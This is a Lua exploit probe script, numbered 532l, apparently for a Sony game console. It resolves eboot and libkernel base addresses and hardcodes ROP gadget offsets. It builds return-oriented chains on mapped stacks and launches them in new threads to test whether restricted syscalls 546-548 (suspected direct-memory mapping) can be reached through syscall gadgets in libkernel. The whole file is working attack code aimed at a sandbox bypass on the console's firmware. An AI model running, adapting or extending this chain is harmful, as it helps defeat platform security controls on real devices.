-- CRASH_CLASS: MODERATE
-- PROBE 532l: Use libkernel syscall gadget for restricted syscalls
--
-- Hypothesis: syscalls 546-554 are blocked based on the IP of the
-- `syscall` instruction. The loader's fn_addr is in eboot — blocked.
-- But if we use a `syscall; ret` gadget inside libkernel .text,
-- it might be whitelisted.
--
-- From 532k GOT: text+0x000D0 is in the relro GOT.
-- It could be a syscall stub. Even if we can't read its bytes (XO),
-- we can TRY using it as a syscall gadget.
--
-- Test: call sys 548 (suspected MapDirectMemory syscall) using
-- libkernel_text+0x000D0 as the syscall gadget instead of fn_addr.
-- If it returns something other than -1, we found the bypass.
--
-- Also try: other offsets where syscall stubs typically live in libkernel.
-- Common pattern: Sony libkernel has a "syscall trampoline" at a known offset.

print("=== PROBE 532l: LIBKERNEL SYSCALL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local old_syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

-- Get bases
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("lk=" .. q(lk))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local pop_rdx_ret = eb + uint64(0x3B02D7)
local pop_rcx_ret = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local jmp_self = eb + uint64(0x15481)
local alloc_fn = lk + uint64(0x17EF0)

-- Candidate syscall gadgets in libkernel .text
-- We can't read them (XO), but if they're `syscall; ret` (0F 05 C3),
-- they'll work when jumped to with rax=syscall_number.
local lk_candidates = {
    0x000D0,   -- from GOT entry
    0x003A0,   -- from GOT entry
    0x02D50,   -- from GOT entry
}

-- First: test each candidate with getpid (sys 20) — known working syscall
print("")
print("[1] Test candidates with getpid(20)")
for _, off in ipairs(lk_candidates) do
    local candidate = lk + uint64(off)
    -- Build a tiny chain: pop_rax(20), jump to candidate, store rax, park
    local ok_s, shared = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    zero(shared, 64)
    wq(shared, uint64(0xDEAD))

    local ok_st, stack_base = pcall(function()
        return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    local ok_t, tcb_page = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    for toff = 0, 0x100, 8 do wq(tcb_page + toff, tcb_page) end
    local tcb_ptr = memory.alloc(8); wq(tcb_ptr, tcb_page)

    local chain = stack_base + 0x40000 - 0x200
    local i = 0
    local function emit(v) wq(chain + i, v); i = i + 8 end

    -- sysarch
    emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb_ptr)
    emit(old_syscall_ret)  -- use old gadget for sysarch (known working)

    -- getpid via candidate
    emit(pop_rax_ret); emit(uint64(20))
    emit(candidate)  -- jump to libkernel candidate as syscall gadget

    -- store result
    emit(pop_rdi_ret); emit(shared)
    emit(mov_rdi_rax_ret)

    emit(jmp_self)

    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + 0x108, uint64(0x480)); wd(ctx + 0x0D0, 0); wq(ctx + 0x110, uint64(0x10000))
    wq(ctx + 0x0C0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3B)); wq(ctx + 0x0F0, uint64(0x202))
    wq(ctx + 0x0E0, pop_rax_ret); wq(ctx + 0x0F8, chain)

    local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
    local ok_tc, rv = pcall(function()
        return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
    end)

    local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, 300000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    local result = rq(shared)
    local rn = to_num(result); if rn < 0 then rn = rn + 0x100000000 end
    local status
    if rn == 0xDEAD then
        status = "CRASHED (sentinel unchanged)"
    elseif rn > 0 and rn < 0x100000 then
        status = string.format("PID=%d (WORKS!)", rn)
    else
        status = q(result)
    end
    print(string.format("  lk+0x%05X: %s", off, status))
end

-- [2] If any candidate works, test sys 548 with it
-- For now, also test via make_syscall with the loader's fn_addr
-- but from a CHILD THREAD (child might have different sandbox)
print("")
print("[2] Sys 546-548 from child thread (via loader fn_addr)")

local phys_out = memory.alloc(8); wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))

-- Simple child: sysarch → sys 548(out, len, prot, flags, phys, align) → store rv → park
local ok_s2, shared2 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared2, 64)
local ok_st2, stack2 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ok_t2, tcb2 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for toff = 0, 0x100, 8 do wq(tcb2 + toff, tcb2) end
local tcb2_ptr = memory.alloc(8); wq(tcb2_ptr, tcb2)

local out_ptr = memory.alloc(8)

for _, sn in ipairs({546, 547, 548}) do
    wq(out_ptr, uint64(0))
    wq(shared2, uint64(0xEEEE))
    wq(shared2 + 8, uint64(0xFFFF))

    local chain = stack2 + 0x200000 - 0x400
    local i = 0
    local function emit(v) wq(chain + i, v); i = i + 8 end

    -- sysarch
    emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb2_ptr)
    emit(old_syscall_ret)

    -- syscall sn: rax=sn, rdi=out_ptr, rsi=len, rdx=prot
    -- r10=flags(from ctx), r8=phys(from ctx), r9=align(from ctx)
    emit(pop_rax_ret); emit(uint64(sn))
    emit(pop_rdi_ret); emit(out_ptr)
    emit(pop_rsi_ret); emit(uint64(0x4000))
    emit(pop_rdx_ret); emit(uint64(3))
    emit(old_syscall_ret)

    -- store rv
    emit(pop_rdi_ret); emit(shared2)
    emit(mov_rdi_rax_ret)

    -- store out_ptr value
    emit(pop_rdi_ret); emit(shared2 + 8)
    emit(pop_rax_ret); emit(uint64(0x444F4E45))
    emit(mov_rdi_rax_ret)

    emit(jmp_self)

    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + 0x108, uint64(0x480)); wd(ctx + 0x0D0, 0); wq(ctx + 0x110, uint64(0x10000))
    wq(ctx + 0x0C0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3B)); wq(ctx + 0x0F0, uint64(0x202))
    wq(ctx + 0x0E0, pop_rax_ret); wq(ctx + 0x0F8, chain)
    wq(ctx + 0x060, uint64(0))        -- r10 = flags = 0
    wq(ctx + 0x068, phys)             -- r8 = phys
    wq(ctx + 0x070, uint64(0x4000))   -- r9 = align

    local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
    pcall(function() sc_430(uint64(ctx), uint64(tid_buf), uint64(0)) end)

    local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, 300000000)
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    local rv_s = rq(shared2)
    local done = rq(shared2 + 8)
    local va_s = rq(out_ptr)
    print(string.format("  sys %d: rv=%s done=%s out=%s", sn, q(rv_s), q(done), q(va_s)))
end

print("")
print("=== 532l DONE ===")
